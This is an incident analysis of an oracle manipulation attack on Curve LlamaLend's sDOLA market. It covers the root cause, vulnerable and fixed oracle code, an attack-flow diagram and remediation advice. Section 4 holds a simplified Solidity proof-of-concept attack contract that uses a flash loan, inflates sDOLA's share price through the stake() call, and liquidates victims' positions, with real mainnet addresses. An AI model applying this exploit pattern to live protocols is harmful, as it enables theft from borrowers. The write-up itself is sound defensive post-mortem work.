# Curve LlamaLend — sDOLA Share Price Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2026-03-02 |
| **Protocol** | Curve LlamaLend (sDOLA market) |
| **Chain** | Ethereum Mainnet (block 24,566,937) |
| **Loss** | ~$240,000 |
| **Attacker EOA** | `0x33a0aab2642c78729873786e5903cc30f9a94be2` |
| **Attack Contract 1** | `0xd8E8544E0c808641b9b89dfB285b5655BD5B6982` |
| **Attack Contract 2** | `0xC6C2fcdf688BAeB7b03D9D9C088c183dbB499ac0` |
| **Attack Tx** | `0xb93506af8f1a39f6a31e2d34f5f6a262c2799fef6e338640f42ab8737ed3d8a4` |
| **Vulnerable Contract** | LlamaLend crvUSD Controller `0xaD444663c6C92B497225c6cE65feE2E7F78BFb86` |
| **Exploited Vault** | sDOLA (Inverse Finance ERC-4626) `0xb45ad160634c528Cc3D2926d9807104FA3157305` |
| **Root Cause** | sDOLA `totalAssets` inflation via `DOLA_SAVINGS.stake()` — a non-standard entry point that increases vault assets without minting shares |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-03/Curve_LlamaLend_exp.sol) |

---

## 1. Vulnerability Overview

Curve LlamaLend's sDOLA market accepts sDOLA (Inverse Finance's ERC-4626 vault) as collateral and uses `sDOLA.convertToAssets(1e18)` as a spot oracle to compute collateral value.

sDOLA architecture:
- `totalAssets()` = `DOLA_SAVINGS.balanceOf(address(sDOLA))`
- The underlying asset store is the DOLA Savings Account (DSA) contract `0xE5f24791E273Cb96A1f8E5B67Bc2397F0AD9B8B4`

**Root vulnerability**: DSA's `stake(uint256 amount, address recipient)` credits DOLA to any arbitrary `recipient`'s DSA balance **without minting sDOLA shares**. When the attacker passes `address(sDOLA)` as the recipient:

```
totalAssets ↑  (DOLA credited to vault's DSA balance)
totalSupply →  unchanged (no shares minted)
convertToAssets(1e18) = totalAssets * 1e18 / totalSupply  →  spikes
```

LlamaLend reads this inflated spot value and misprices sDOLA collateral ~14% above its real value, distorting the liquidation mechanism.

> **Note**: A standard ERC-4626 `deposit()` mints proportional shares and therefore does **not** change `convertToAssets()`. The manipulation here is not a standard deposit — it exploits DSA's non-standard `stake()` function to inflate `totalAssets` without share issuance.

---

## 2. Vulnerable Code Analysis

### Vulnerable Code

```solidity
// ❌ Vulnerable: uses sDOLA spot convertToAssets() directly as oracle
// LlamaLend crvUSD Controller (estimated)
function _getCollateralPrice() internal view returns (uint256) {
    // convertToAssets() returns totalAssets/totalSupply ratio instantly —
    // can be distorted within a single block via DOLA_SAVINGS.stake()
    return IsDOLA(sDOLA).convertToAssets(1e18);
}
```

```solidity
// ❌ Vulnerable: IDolaSavings — stake() credits DOLA to any recipient
// Non-standard entry point that can inflate vault totalAssets without minting shares
interface IDolaSavings {
    // Credits `amount` DOLA to `recipient`'s DSA balance (no shares minted)
    function stake(uint256 amount, address recipient) external;
    function balanceOf(address account) external view returns (uint256);
}
```

### Fixed Code

```solidity
// ✅ Fixed: use TWAP or minimum-based price
function _getCollateralPrice() internal view returns (uint256) {
    uint256 spotPrice = IsDOLA(sDOLA).convertToAssets(1e18);
    uint256 twapPrice = _getTWAP(sDOLA, TWAP_PERIOD);
    // Manipulation defense: use the lower of spot and TWAP
    return spotPrice < twapPrice ? spotPrice : twapPrice;
}
```

---

## 3. Attack Flow

```
Attacker (0x33a0...b8b4)
  │
  ├─[1] Flash loan from Morpho Blue
  │       10,000,000 USDC + all available WETH
  │
  ├─[2] USDC → alUSD (alUSD_FRAXB3CRV_F pool, exchange_underlying 2→0)
  │       alUSD → sDOLA (alUSD_sDOLA pool, exchange 1→0)
  │       Acquire ~650K sDOLA
  │
  ├─[3] Deposit WETH into crvUSD_Controller_2 → borrow crvUSD
  │       scrvUSD.deposit(~7M crvUSD) → acquire scrvUSD shares
  │       SAVE_DOLA pool: swap scrvUSD → sDOLA (acquire more sDOLA)
  │       LLAMMA_CRV_USD_AMM.exchange(0→1): bulk crvUSD → sDOLA swap
  │
  ├─[4] sDOLA.redeem(entire balance) → receive underlying DOLA
  │
  ├─[5] ★ ORACLE MANIPULATION ★
  │       DOLA_SAVINGS.stake(190_777_474_808_103_397_780_234, address(sDOLA))
  │       → Credits ~190,777 DOLA directly to sDOLA vault's DSA balance
  │       → totalAssets ↑, totalSupply unchanged
  │       → convertToAssets(1e18): 1.188 DOLA → 1.358 DOLA (~14% spike)
  │
  ├─[6] LLAMMA_CRV_USD_AMM.exchange(0,1,0,1) → force oracle sync
  │
  ├─[7] Deploy AttackContract2, transfer crvUSD to it
  │       AttackContract2.liquidateAllUsers():
  │         - Call crvUSD_Controller.users_to_liquidate()
  │           (manipulated price classifies 27 users as liquidatable)
  │         - Liquidate 27 positions → acquire sDOLA collateral + crvUSD
  │           at below-market prices
  │
  ├─[8] Unwind all positions
  │       Redeem sDOLA → DOLA, repay scrvUSD, close crvUSD position
  │       Reverse swaps to restore USDC/WETH
  │
  └─[9] Repay Morpho Blue flash loan
          Net profit: ~$240,000 (DOLA + WETH)
```

---

## 4. PoC Code (based on DeFiHackLabs)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Relevant addresses (Ethereum Mainnet)
// sDOLA:                0xb45ad160634c528Cc3D2926d9807104FA3157305
// DOLA_SAVINGS (DSA):   0xE5f24791E273Cb96A1f8E5B67Bc2397F0AD9B8B4
// LlamaLend Controller: 0xaD444663c6C92B497225c6cE65feE2E7F78BFb86
// Morpho Blue:          0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb

interface IMorphoBlue {
    function flashLoan(address token, uint256 amount, bytes calldata data) external;
}

interface IDolaSavings {
    // ★ Vulnerability: credits DOLA to recipient's DSA balance without minting sDOLA shares
    function stake(uint256 amount, address recipient) external;
    function balanceOf(address account) external view returns (uint256);
}

interface IsDOLA {
    function deposit(uint256 assets, address receiver) external returns (uint256 shares);
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets);
    function mint(uint256 shares, address receiver) external returns (uint256 assets);
    function convertToAssets(uint256 shares) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
}

interface ILlamaLend {
    function users_to_liquidate() external view returns (address[] memory);
    function liquidate(address user, uint256 minCollateral) external;
}

contract LlamaLendAttack {
    IMorphoBlue constant morpho      = IMorphoBlue(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb);
    IDolaSavings constant DOLA_SAVINGS = IDolaSavings(0xE5f24791E273Cb96A1f8E5B67Bc2397F0AD9B8B4);
    IsDOLA       constant sDOLA      = IsDOLA(0xb45ad160634c528Cc3D2926d9807104FA3157305);
    ILlamaLend   constant llamaLend  = ILlamaLend(0xaD444663c6C92B497225c6cE65feE2E7F78BFb86);

    function attack() external {
        morpho.flashLoan(USDC, 10_000_000e6, abi.encode("attack"));
    }

    function onMorphoFlashLoan(uint256 amount, bytes calldata) external {
        // [1–4] Acquire sDOLA via multiple pools, then redeem all for DOLA
        uint256 sDolaBalance = sDOLA.balanceOf(address(this));
        sDOLA.redeem(sDolaBalance, address(this), address(this));

        // ★ [5] ORACLE MANIPULATION — core exploit
        // DOLA_SAVINGS.stake() credits DOLA to address(sDOLA)'s DSA balance
        // without minting any sDOLA shares.
        // → sDOLA.totalAssets() spikes, totalSupply unchanged
        // → convertToAssets(1e18): 1.188e18 → 1.358e18
        uint256 dolaToStake = DOLA_SAVINGS.balanceOf(address(this));
        DOLA_SAVINGS.stake(dolaToStake, address(sDOLA));

        // [7] Execute liquidations against the inflated oracle price
        address[] memory victims = llamaLend.users_to_liquidate();
        for (uint i = 0; i < victims.length; i++) {
            llamaLend.liquidate(victims[i], 0);
        }

        // [8] Unwind positions, repay flash loan
        // ... reverse swaps omitted ...
        IERC20(USDC).approve(address(morpho), amount + fee);
    }
}
```

---

## 5. Vulnerability Classification

| Category | Details |
|------|-----------|
| **Vulnerability Type** | ERC-4626 Share Price Manipulation via External State Injection |
| **Attack Vector** | Flash loan + non-standard `stake()` to inflate vault `totalAssets` without minting shares |
| **Impact Scope** | Entire LlamaLend sDOLA market liquidation mechanism |
| **DASP Classification** | Price Oracle Manipulation |
| **CWE** | CWE-682: Incorrect Calculation |
| **Severity** | High |

### Technical Classification

A standard ERC-4626 `deposit()` mints proportional shares and therefore leaves `convertToAssets()` unchanged. This attack exploits a **non-standard external entry point** — `DOLA_SAVINGS.stake(amount, address(sDOLA))` — that increases the vault's underlying asset balance without issuing any shares. Because LlamaLend consumes this value as a spot price with no TWAP, single-block manipulation is possible.

### Why This Attack Is Profitable (vs. a Typical Donation)

A naive donation attack cannot generate profit:

```
Attacker donates X tokens to vault
  → share price rises
  → existing shareholders benefit
  → attacker holds no shares → cannot redeem at inflated price → net loss
```

The staked DOLA is irrecoverable — it permanently enters the sDOLA vault's `totalAssets` and cannot be withdrawn by the attacker. This is structurally identical to a donation.

This attack is profitable because **the profit source is not the vault itself (redeem) but an external protocol (LlamaLend liquidations)**:

```
DOLA_SAVINGS.stake() → sDOLA totalAssets inflated
                              ↓
              LlamaLend oracle reads inflated convertToAssets()
                              ↓
              Debt value of sDOLA borrowers rises ~14%
                              ↓
              Healthy positions fall below liquidation threshold
                              ↓
              Attacker liquidates 27 positions → acquires collateral at discount
                              ↓
              Liquidation profit > stake cost = ~$240K net gain
```

The staked DOLA is the attack cost — irrecoverably consumed to manipulate the oracle. The liquidation profits exceed this cost, making the attack net-positive. **`stake()` is the oracle manipulation tool; the profit mechanism is liquidation.** Without `sDOLA.convertToAssets()` being wired as LlamaLend's oracle, this attack would not be viable.

---

## 6. Remediation Recommendations

1. **Introduce TWAP Oracle**: Apply a minimum 10–30 minute TWAP to vault share price — neutralizes single-block manipulation
2. **Use Minimum Value**: Use the lower of spot price and TWAP for collateral valuation
3. **Audit ERC-4626 Integrations**: Review all non-standard asset-increase paths in integrated vaults (`stake()`, direct `transfer()`, etc.)
4. **Add Independent Chainlink Feed**: Avoid sole reliance on vault-internal pricing by adding an external oracle
5. **Liquidation Delay**: Require at least a 1-block delay before executing liquidations — breaks atomic price-manipulation + liquidation composability

---

## 7. Lessons Learned

- **Standard ERC-4626 `deposit()` does not increase share price**: Deposit mints proportional shares, keeping the ratio constant. Share price can only be inflated via donation (asset increase without share issuance).
- **Non-standard entry points become donation vectors**: Any function that increases a vault's `totalAssets` without minting shares — whether `stake()`, direct `transfer()`, or an unguarded `credit()` — is a potential oracle manipulation path. These must be identified during integration audits.
- **Spot oracles are not trustworthy in a flash loan environment**: In a world where hundreds of millions of dollars can be moved within a single block, block-level spot price references are inherently manipulable.
- **Liquidation mechanisms require the strongest oracle protections**: Because liquidations cause direct, irreversible losses to users, the reliability of the price feed is especially critical.
- **Donation attacks can be profitable when profit is sourced externally**: A donation that manipulates an oracle used by a third-party protocol can be net-positive even though the donated assets are unrecoverable — the profit comes from the third-party mechanism, not the vault itself.
